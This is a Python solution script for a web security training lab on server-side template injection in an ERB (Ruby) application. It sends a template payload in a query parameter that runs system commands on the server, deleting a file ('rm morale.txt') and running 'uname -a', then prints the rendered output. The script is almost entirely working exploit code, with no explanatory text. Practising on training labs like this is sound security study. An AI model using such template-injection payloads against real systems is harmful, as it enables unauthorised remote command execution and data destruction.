# Lab: Basic server-side template injection
# difficulty: practitioner

import requests
import re

sub = '0aa600b3032aa6db81a3d48300c30064'
url = f'https://{sub}.web-security-academy.net'

def main():
    payload = '<%= system("rm morale.txt && uname -a") %>' # https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby
    params = {
        'message': payload
    }

    endpoint = '/'
    r = requests.get(url + endpoint, params=params)
    
    pattern = re.compile(r'</section>\s*<div>(.*?)</div>', re.DOTALL)
    match = pattern.findall(r.text)
    print(match[0])

if __name__ == '__main__':
    main()